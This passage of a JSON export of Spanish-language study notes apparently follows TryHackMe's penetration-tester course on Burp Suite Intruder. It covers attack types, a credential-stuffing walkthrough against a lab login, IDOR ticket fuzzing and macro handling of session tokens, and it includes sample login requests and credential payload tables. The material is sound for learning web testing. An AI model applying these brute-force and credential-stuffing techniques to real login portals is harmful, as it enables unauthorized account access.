ataque.\n\n-------------------------------\n<h2>Challenge</h2>\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251116173639.png]]\n2. Activamos la intercepci√≥n y nos logueamos con test test, por ejemplo. Mandamos la petici√≥n al Intruder.\n   ![[Pasted image 20251116173803.png]]\n3. Configuramos Pitchfork attack, limpiamos las posiciones asignadas y seleccionamos username y password.\n   ![[Pasted image 20251116174100.png]]\n4. En los payloads sets cargamos las mismas listas que usamos para el otro ataque.\n   ![[Pasted image 20251116174248.png]]\n   ![[Pasted image 20251116174308.png]]\n5. Como no podemos usar grep para seleccionar la cookie cambiante debido a la redirecci√≥n, necesitaremos configurar una macro. Las macros nos permiten realizar la misma acci√≥n repetidamente. En este caso s√≥lo queremos mandar una petici√≥n `GET` a `/admin/login/`. Para hacerlo:\n\t1. Volvemos a la pesta√±a Settings.\n\t   ![[Pasted image 20251116174845.png]]\n\t2. Hacemos click en la categor√≠a \"Sessions\", vamos hasta abajo y seleccionamos \"Macros\" y le damos a \"Add\".\n\t   ![[Pasted image 20251116174941.png]]\n\t3. El men√∫ que aparece nos mostrar√° nuestro historial de peticiones. Con la petici√≥n seleccionada haz click en OK.\n\t   ![[Pasted image 20251116175018.png]]\n\t4. Finalmente dale a la macro un nombre acorde.\n\t   ![[Pasted image 20251116175042.png]]\n6. Ahora que tenemos una macro definida, necesitamos configurar las reglas de manejo de sesiones que definen c√≥mo deber√≠amos usar la macro.\n\t1. En la categor√≠a de \"Sessions\" de los ajustes principales ve arriba hasta \"Session Handling Rules\" y dale a \"Add\".\n\t   ![[Pasted image 20251116175732.png]]\n\t2. Saltar√° una nueva ventana con dos pesta√±as: \"Details\" y \"Scope\". Rellena una descripci√≥n adecuada y cambia a la pesta√±a \"Scope\".\n\t   ![[Pasted image 20251116175844.png]]\n\t3. Desmarca todas las opciones menos \"Intruder\" ya que no necesitamos que esta macro se aplique en ning√∫n otro sitio.\n\t   ![[Pasted image 20251116175910.png]]\n\t4. En la secci√≥n \"URL Scope\", selecciona \"Use suite scope\". Esto selecciona la macro para que s√≥lo opere en sitios que hayan sido a√±adidos al scope global. Si no has seleccionado un scope global selecciona \"Use custom scope\" y a√±ade `http://10.10.101.156/` al scope en esta secci√≥n.\n\t   ![[Pasted image 20251116175938.png]]\n\t   ![[Pasted image 20251116180009.png]]\n7. Ahora debemos volver a la pesta√±a \"Details\" y seleccionar \"Rule Actions\". Le damos a \"Add\", seleccionamos \"Run a Macro\" de esta lista y selecciona la macro que creamos antes.\n   ![[Pasted image 20251116180219.png]]\n   ![[Pasted image 20251116180317.png]]\n8. Ahora, la macro meter√° las cookies directamente en nuestras peticiones. Sin embargo, debemos restringir qu√© par√°metros van a ser actualizados entre peticiones.\n\t1. Seleccionamos \"Update only the following parameters and headers\" y le damos a \"Edit\".\n\t2. Escribimos \"loginToken\" en el campo \"Enter a new item\".\n\t3. Seleccionamos \"Update only the following cookies\" y le damos a \"Edit\".\n\t4. Escribimos \"session\" en el campo \"Enter a new item\".\n\t   ![[Pasted image 20251116180800.png]]\n9. Le damos a OK y estamos listos. Comenzamos el ataque.\n   ![[Pasted image 20251116181030.png]]\n10. Ahora tenemos una macro definida que sustituye en cada petici√≥n la cookie de \"session\" y \"loginToken\" por una v√°lida que obtiene de realizar una petici√≥n `GET` a login.\n11. Como ya nos pas√≥ en el √∫ltimo ataque, todas las respuestas son 302 (redirecci√≥n) por lo que debemos ordenarlas por longitud de respuesta.\n    ![[Pasted image 20251116181418.png]]\n12. Con las credenciales obtenidas nos logueamos:\n    ![[Pasted image 20251116181526.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Practical Example",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/9-practical-example/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/9. Practical Example.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "Para poner a prueba nuestro nuevo conocimiento te√≥rico, vamos a intentar ganar acceso al portal de soporte que nos dan. Sigue una estructura de login t√≠pica y despu√©s de inspeccionar el c√≥digo fuente, encontramos que no se han tomado medidas protectoras.\n\n```html\n---\n<form method=\"POST\">\n    <div class=\"form-floating mb-3\">\n        <input class=\"form-control\" type=\"text\" name=username placeholder=\"Username\" required>\n        <label for=\"username\">Username</label>\n    </div>\n    <div class=\"form-floating mb-3\">\n        <input class=\"form-control\" type=\"password\" name=password  placeholder=\"Password\" required>\n        <label for=\"password\">Password</label>\n    </div>\n    <div class=\"d-grid\"><button class=\"btn btn-primary btn-lg\" type=\"submit\">Login!</button></div>\n</form>\n---\n```\n\nComo no tiene medidas de protecci√≥n tenemos varias formas de explotar este formulario, como un ataque cluster bomb para bruteforcear las credenciales. Sin embargo, tenemos un acercamiento m√°s sencillo a nuestra disposici√≥n.\n\nAproximadamente hace 3 meses, Bastion Hosting sufri√≥ un ataque que exfiltr√≥ nombres de usuario, correos y algunas contrase√±as en texto plano. Aunque la compa√±√≠a alert√≥ a los usuarios para que cambiasen sus contrase√±as puede que algunos empleados no hicieran caso.\n\nComo poseemos una lista de nombres de usuarios cada uno acompa√±ados de una contrase√±a, podemos probar un ataque de credential-stuffing, mucho m√°s r√°pido que uno de brute-forcing.\n\n-----------------------------\n<h2>Challenge</h2>\n1. Primero descargamos la lista con nombres de usuario y contrase√±as del link dado.\n   ![[Pasted image 20251115210129.png]]\n2. Entramos en la p√°gina dada.\n   ![[Pasted image 20251115210202.png]]\n3. Abrimos Burp Suite.\n   ![[Pasted image 20251115210219.png]]\n4. Mandamos una petici√≥n de login que interceptamos y mandamos al Intruder.\n   ![[Pasted image 20251115210247.png]]\n5. Una vez en el intruder seleccionamos Pitchfork.\n   ![[Pasted image 20251115210312.png]]\n6. Le damos a `Auto ¬ß` y se rellenar√°n username y password:\n   ![[Pasted image 20251115210455.png]]\n7. Descomprimimos las listas:\n   ![[Pasted image 20251115210548.png]]\n8. En el primer payload set seleccionamos la lista de usuarios y en la segunda la de contrase√±las con el bot√≥n `Load`.\n   ![[Pasted image 20251115210725.png]]\n   ![[Pasted image 20251115210742.png]]\n9. Le damos a comenzar ataque y esperamos. Como no devuelve c√≥digos de estado v√°lidos porque todos son diferentes, debemos fijarnos en la longitud de la respuesta, la que es diferente ser√° del usuario que ha olvidado cambiar la contrase√±a y por lo tanto es un login exitoso.\n   ![[Pasted image 20251115210954.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Instroduction to Attack Types",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/4-instroduction-to-attack-types/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/4. Instroduction to Attack Types.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "La pesta√±a de Positions del Intruder de Burp Suite tiene un men√∫ desplegable para seleccionar el tipo de ataque. El Intruder ofrece 4 tipos de ataque. Esplor√©moslos:\n\n1. **Sniper:** Es el tipo por defecto y el m√°s com√∫nmente usado. Cicla el payload insertando uno de cada vez en cada posici√≥n definida. Itera sobre los payloads en estilo linear permitiendo testeo preciso y enfocado.\n2. **Battering ram:** Difiere del Sniper en que manda todos los payloads a la vez, cada uno en su respectiva posici√≥n. √ötil para testear race conditions o cuando se necesitan mandar payloads concurrentemente.\n3. **Pitchfork:** Habilita el testeo simult√°neo de m√∫ltiples posiciones con diferentes payloads. Permite definir m√∫ltiples conjuntos de payloads, cada uno asociado con una posici√≥n.\n4. **Cluster bomb:** Combina el Sniper y el Pitchfork. Realiza un ataque de tipo Sniper en cada posici√≥n pero simult√°neamente testea todos los payloads de cada set.\n\nCada tipo de ataque tiene sus ventajas y es adecuado para un escenario en concreto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Sniper",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/5-sniper/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/5. Sniper.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "Es el tipo de ataque por defecto y el m√°s com√∫n de Burp Suite Intruder. Es particularmente efectivo para posiciones √∫nicas de ataque como ataques de fuerza bruta en contrase√±as o fuzzing endpoints de APIs. En un ataque Sniper, proporcionamos un conjunto de payloads que puede ser desde una lista de palabras hasta un rango de n√∫meros y el Intruder lo inserta en la posici√≥n definida.\n\nTomemos la siguiente petici√≥n de ejemplo:\n\n```python\nPOST /support/login/ HTTP/1.1\nHost: MACHINE_IP\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 37\nOrigin: http://MACHINE_IP\nConnection: close\nReferer: http://MACHINE_IP/support/login/\nUpgrade-Insecure-Requests: 1\n\nusername=¬ßpentester¬ß&password=¬ßExpl01ted¬ß\n```\n\nEn este ejemplo tenemos dos posiciones definidas: `username` y `password`. En un ataque sniper, el intruder toma cada payload del conjunto de payloads u lo sustituye en cada una de las posiciones por turnos. Asumiendo un diccionario de tres palabras: `burp`, `suite` e `intruder`, el Intruder generar√≠a seis peticiones:\n\n| N√∫mero de Petici√≥n | Cuerpo de la Petici√≥n                  |\n| ------------------ | -------------------------------------- |\n| 1                  | `username=burp&password=Expl01ted`     |\n| 2                  | `username=suite&password=Expl01ted`    |\n| 3                  | `username=intruder&password=Expl01ted` |\n| 4                  | `username=pentester&password=burp`     |\n| 5                  | `username=pentester&password=suite`    |\n| 6                  | `username=pentester&password=intruder` |\nObserva c√≥mo al principio la segunda posici√≥n no la cambia y al final no toca la primera. La forma de calcular el n√∫mero de peticiones es `peticiones = numeroDePalabras * numeroDePosiciones`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Payloads",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/3-payloads/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/3. Payloads.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "En la pesta√±a Payloads de Burp Suite, podemos crear, asignar y configurar payloads para nuestro ataque. Esta subpesta√±a est√° dividida en 4 secciones.\n\n![[Pasted image 20251115141048.png]]\n\n1. **Payload sets:**\n\t- Esta secci√≥n nos permite elegir la posici√≥n para la cual queremos configurar el conjunto de payloads y seleccionar el tipo de payload que queremos usar.\n\t- Al usar tipos de ataque que s√≥lo permiten un tipo de conjunto de payloads (como Sniper o Battering Ram), el desplegable de payload set s√≥lo tendr√° una opci√≥n.\n\t- Si usamos tipos de ataque que requieran m√∫ltiples conjuntos de payloads (como Pitchfork o Cluster Bomb), habr√° un √≠tem en el desplegable para cada posici√≥n.\n2. **Payload settings:**\n\t- Esta secci√≥n ofrece opciones espec√≠ficas del payload seleccionado para el set de payloads actual.\n\t- Por ejemplo, al usar el tipo de payload \"Simple List\", podemos a√±adir o eliminar manualmente payloads del set usando **Add**, **Paste**, **Load** y **Remove** o **Clear**.\n\t- Cada tipo de payload tendr√° su propio set de opciones y funcionalidad. Explora las opciones disponibles para entender las posibilidades.\n\t  \n\t  ![[Pasted image 20251115175908.png]]\n\t  \n3. **Payload processing:**\n\t- En esta secci√≥n, podemos definir reglas para que se apliquen a cada payload en el set antes de mandarse al objetivo.\n\t- Podemos por ejemplo poner cada palabra en may√∫scula, saltar payloads que coincidan con una regex o aplicar otras transformaciones o filtros.\n\t- Aunque probablemente no uses esta secci√≥n muy a menudo tiene bastante valor cuando se requiere un procesado de un payload concreto para tu ataque.\n4. **Payload encoding:**\n\t- Esta secci√≥n nos permite personalizar el tipo de encoding de nuestros payloads.\n\t- Por defecto, Burp Suite aplica URLencoding para asegurar la transmisi√≥n de los payloads.\n\t- Podemos eliminar el encoding por defecto modificando la lista de caracteres que tengan que ser encodeados o desmarcando la opci√≥n \"URL-encode there characters\".\n\nHaciendo uso de estas secciones podemos crear y personalizar conjuntos de payloads para ajustarse a nuestras necesidades.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Cluster Bomb",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/8-cluster-bomb/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/8. Cluster Bomb.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "El tipo de ataque Cluster bomb en el intruder de Burp Suite nos permite elegir m√∫ltiples sets de payloads, uno por posici√≥n (hasta un m√°ximo de 20). Al contrario que Pitchfork, donde todos los sets de payloads se testean de forma simult√°nea, Cluster bomb itera a trav√©s de cada set de payloads individualmente asegur√°ndose de que cada combinaci√≥n posible se compruebe.\n\nPara ilustrarlo usaremos los mismos diccionarios de antes:\n\n1. El primer diccionario contiene nombres de usuario: `joel`, `harriet` y `alex`.\n2. El segundo diccionario contiene contrase√±as: `J03l`, `Emma1815` y `Sk1ll`.\n\nEn este caso, la tabla de peticiones se ve as√≠:\n\n| N√∫mero de Petici√≥n | Cuerpo de la Petici√≥n                |\n| ------------------ | ------------------------------------ |\n| 1                  | `username=joel&password=J03l`        |\n| 2                  | `username=harriet&password=J03l`     |\n| 3                  | `username=alex&password=J03l`        |\n| 4                  | `username=joel&password=Emma1815`    |\n| 5                  | `username=harriet&password=Emma1815` |\n| 6                  | `username=alex&password=Emma1815`    |\n| 7                  | `username=joel&password=Sk1ll`       |\n| 8                  | `username=harriet&password=Sk1ll`    |\n| 9                  | `username=alex&password=Sk1ll`       |\nPodemos calcular el n√∫mero de peticiones multiplicando las entradas de cada diccionario entre s√≠. La edici√≥n de comunidad tiene un l√≠mite de frecuencia de petici√≥n. Puede saturar la red en ataques muy grandes ya que prueba cada combinaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Positions",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/2-positions/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/2. Positions.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "Al usar el Intruder para realizar un ataque, el primer paso es examinar las posiciones en la petici√≥n en las que queremos insertar nuestros payloads.\n\nNaveguemos a la pesta√±a Positions:\n\n![[Pasted image 20251115135953.png]]\n\nF√≠jate en que Burp Suite intenta identificar las posiciones m√°s probables donde se insertar√°n los payloads autom√°ticamente. Estas posiciones se resaltan en verde y se rodean con los marcadores de secci√≥n (`¬ß`).\n\nEn la parte de la derecha de la interfaz, encontramos los siguientes botones: `Add ¬ß`, `Clear ¬ß`, and `Auto ¬ß`:\n\n- El `Add ¬ß` nos permite definir nuevas posiciones manualmente resalt√°ndolas y haciendo click en el bot√≥n.\n- El `Clear ¬ß` elimina todas las posiciones definidas ofreciendo un lienzo en blanco donde podemos definir nuestras propias posiciones.\n- El `Auto ¬ß` intenta identificar autom√°ticamente las posiciones m√°s probables bas√°ndose en la petici√≥n. Es √∫til si borramos las posiciones iniciales y las queremos de vuelta.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Pitchfork",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/7-pitchfork/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/7. Pitchfork.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "El ataque Pitchfork en el Intruder de Burp Suite es similar a tener m√∫ltiples ataques Sniper a la vez. Mientras que el Sniper usa un set de payloads para testear todas las posiciones de forma simult√°nea, Pitchfork utiliza un set de payloads por posici√≥n (hasta un m√°ximo de 20) e itera a trav√©s de ellos a la vez.\n\nPara entender Pitchfork vamos a revisar un ejemplo de fuerza bruta,pero esta vez con dos diccionarios.\n\n1. El primer diccionario contiene nombres de usuario: `joel`, `harriet` y `alex`.\n2. El segundo diccionario contiene contrase√±as: `J03l`, `Emma1815` y `Sk1ll`.\n\nPodemos usar estos dos diccionarios para realizar un ataque en el formulario de login. Las peticiones ahora se mostrar√°n as√≠:\n\n| Numero de Petici√≥n | Cuerpo de la Petici√≥n                |\n| ------------------ | ------------------------------------ |\n| 1                  | `username=joel&password=J03l`        |\n| 2                  | `username=harriet&password=Emma1815` |\n| 3                  | `username=alex&password=Sk1ll`       |\nComo se puede observar, el ataque de tipo Pitchfork coge un √≠tem de cada set de payloads y lo sustituye en la posici√≥n correspondiente.\n\n>[!CAUTION] Pitchfork deja de probar combinaciones cuando una de las dos listas se acaba.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is Intruder",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/1-what-is-intruder/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/1. What is Intruder.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "Intruder es una herramienta incorporada en Burp Suite de fuzzeo que permite la modificaci√≥n automatizada de peticiones y el testeo repetitivo de estas. Usando una petici√≥n capturada, el Intruder puede mandar m√∫ltiples peticiones con valores ligeramente alterados. Sirve para varios prop√≥sitos, como bruteforcear formularios de login o realizar ataques de fuzzeo en subdirectorios, endpoints o hosts virtuales.\n\nAunque puede ser usado, Burp de edici√≥n de Comunidad tiene limitada la frecuencia de peticiones por lo que no es la mejor herramienta para este prop√≥sito. Sin embargo, sigue siendo una herramienta muy √∫til.\n\nExploremos la interfaz del Intruder:\n\n![[Pasted image 20251114215310.png]]\n\nLa vista inicial presenta una interfaz simple donde podemos seleccionar nuestro objetivo. Este campo se rellenar√° autom√°ticamente si redireccionamos una petici√≥n desde el proxy con `Ctrl + I` o click derecho y `Send to Intruder`.\n\nHay cuatro subpesta√±as en el Intruder:\n\n- **Positions:** Esta pesta√±a nos permite seleccionar un tipo de ataque y configurar d√≥nde queremos insertar nuestro payload en una plantilla de peticiones.\n- **Payload:** Aqu√≠ podemos seleccionar valores para insertarlos en las posiciones definidas en la pesta√±a **Positions**. Tenemos varias opciones de payload, como cargar √≠tems de una lista. La forma en la que se insertan los payloads depende del tipo de ataque seleccionado. Tambi√©n nos permite modificar el comportamiento del intruder respecto a los payloads, como definir reglas de preprocesado para cada payload (agregar prefijos o sufijos, realizar match&replace o saltar payloads por definici√≥n RegEx).\n- **Resource Pool:** Esta pesta√±a no es particularmente √∫til en la edici√≥n de Comunidad. Permite la asignaci√≥n de recursos entre diversas tareas automatizadas. Sin acceso a estas tareas automatizadas pierde su importancia.\n- **Settings:** Esta pesta√±a nos permite configurar comportamiento de ataque. Lidia con c√≥mo Burp maneja los resultados y el ataque en s√≠ mismo. Por ejemplo, podemos destacar peticiones que contengan texto espec√≠fico o definir una respuesta de Burp para redireccionarlas (3xx).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - Intruder",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/0-burp-suite-intruder/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/0. Burp Suite - Intruder.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "[[1. What is Intruder]]\n[[2. Positions]]\n[[3. Payloads]]\n[[4. Instroduction to Attack Types]]\n[[5. Sniper]]\n[[6. Battering Ram]]\n[[7. Pitchfork]]\n[[8. Cluster Bomb]]\n[[9. Practical Example]]\n[[10. Practical Challenge]]\n[[11. Extra-mile Challenge]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "10. Practical Challenge",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/10-practical-challenge/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/10. Practical Challenge.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "Habiendo ganado acceso al sistema de soporte, tenemos ahora la oportunidad de explorar sus funcionalidades y ver qu√© acciones podemos realizar.\n\nAl acceder a la interfaz de **home** se nos muestra una tabla que ense√±a los diferentes tickets. Haciendo click en cualquier fila, nos redirige a una p√°gina donde podemos ver el ticket completo. Examinando la estructura de la URL, observamos que estas p√°ginas est√°n numeradas usando el formato:\n\n`http://10.10.101.156/support/ticket/NUMBER`\n\nEl sistema de numeraci√≥n indica que a los tickets se les asigna un entero para su ID. Esto nos da dos escenarios posibles:\n\n1. **Access Control:** El endpoint puede estar configurado para restringir el acceso s√≥lo a los tickets asignados a nuestro usuario actual. En este caso s√≥lo podemos ver tickets asociados con nuestra cuenta.\n2. **IDOR Vulnerability:** Alternativamente, puede estar mal configurado conllevando a una vulnerabilidad llamada **Insecure Direct Object Reference (IDOR)**. Si este es el caso, podr√≠amos potencialmente explotar el sistema y leer los tickets existentes, sin importar el usuario asignado.\n\nPara investigarlo m√°s, usaremos la herramienta del Intruder para fuzzear el endpoint `/support/ticket/NUMBER`. \n\n--------------------------------\n<h2>Challenge</h2>\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251116170930.png]]\n2. Iniciamos sesi√≥n con los resultados obtenidos de la √∫ltima pr√°ctica.\n   ![[Pasted image 20251116171101.png]]\n3. Si nos metemos en uno de los tickets vemos el endpoint.\n   ![[Pasted image 20251116171146.png]]\n4. Capturamos una petici√≥n en Burp Suite y la mandamos al Intruder. Seleccionamos Sniper attack y configuramos el n√∫mero como la parte a fuzzear:\n   ![[Pasted image 20251116171352.png]]\n5. Creamos una lista con n√∫meros del 1 al 100.\n   ![[Pasted image 20251116171540.png]]\n6. Cargamos esa lista en el payload set.\n   ![[Pasted image 20251116171618.png]]\n7. Comenzamos el ataque y esperamos. Al terminar nos fijaremos en aquellas solicitudes con c√≥digo de respuesta 200.\n   ![[Pasted image 20251116172035.png]]\n8. Haciendo click en las peticiones correspondientes y fij√°ndonos en la respuesta llegamos hasta la flag.\n   ![[Pasted image 20251116172318.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Battering Ram",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/6-battering-ram/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/6. Battering Ram.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "El tipo de ataque de Battering ram en el Intruder de Burp Suite difiere del tipo Sniper en que coloca el mismo payload en cada posici√≥n a la vez, en vez de hacerlo por turnos. Si usamos el mismo ejemplo:\n\n```python\nPOST /support/login/ HTTP/1.1\nHost: MACHINE_IP\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 37\nOrigin: http://MACHINE_IP\nConnection: close\nReferer: http://MACHINE_IP/support/login/\nUpgrade-Insecure-Requests: 1\n\nusername=¬ßpentester¬ß&password=¬ßExpl01ted¬ß\n```\n\nVeremos que ahora las peticiones que genera con el mismo diccionario de tres palabras (`burp`, `suite` e `intruder`) son:\n\n| N√∫mero de Petici√≥n | Cuerpo de la Petici√≥n                 |\n| ------------------ | ------------------------------------- |\n| 1                  | `username=burp&password=burp`         |\n| 2                  | `username=suite&password=suite`       |\n| 3                  | `username=intruder&password=intruder` |\nCada payload se introduce directamente a la vez en cada posici√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - The Basics",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/1-brup-suite-the-basics/0-burp-suite-the-basics/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/1. Brup Suite - The Basics/0. Burp Suite - The Basics.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 1. Brup Suite - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/0. Burp Suite - The Basics]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/1. Brup Suite - The Basics/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/1-brup-suite-the-basics/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/1. Brup Suite - The Basics/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 1. Brup Suite - The Basics",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 2. Cyber Security 101 -> 8. Web Hacking -> 4. Burp Suite - The Basics**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Exploit Vulnerabilities",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/2-exploit-vulnerabilities/0-exploit-vulnerabilities/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/2. Exploit Vulnerabilities/0. Exploit Vulnerabilities.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 2. Exploit Vulnerabilities",
    "content": "[[1. Automated Vs. Manual Vulnerability Research]]\n[[2. Finding Manual Exploits]]\n[[3. Example of Manual Exploit]]\n[[4. Practical - Manual Exploitation]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Practical - Manual Exploitation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/2-exploit-vulnerabilities/4-practical-manual-exploitation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/2. Exploit Vulnerabilities/4. Practical - Manual Exploitation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 2. Exploit Vulnerabilities",
    "content": "1. Vamos a la p√°gina que nos dan:\n   ![[Pasted image 20251122171305.png]]\n2. Encontramos la versi√≥n de la tienda.\n   ![[Pasted image 20251122171416.png]]\n3. Buscamos en Exploit-DB.\n   ![[Pasted image 20251122171532.png]]\n4. Vamos a usar este exploit contra la p√°gina.\n\t1. Guardamos el exploit y le damos permisos de ejecuci√≥n.\n\t   ![[Pasted image 20251122171911.png]]\n\t2. Lo intentamos usar\n\t   ![[Pasted image 20251122171937.png]]\n\t3. Nos dice lo que necesita y lo introducimos.\n\t   ![[Pasted image 20251122172006.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Finding Manual Exploits",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/2-exploit-vulnerabilities/2-finding-manual-exploits/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/2. Exploit Vulnerabilities/2. Finding Manual Exploits.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research > 2. Exploit Vulnerabilities",
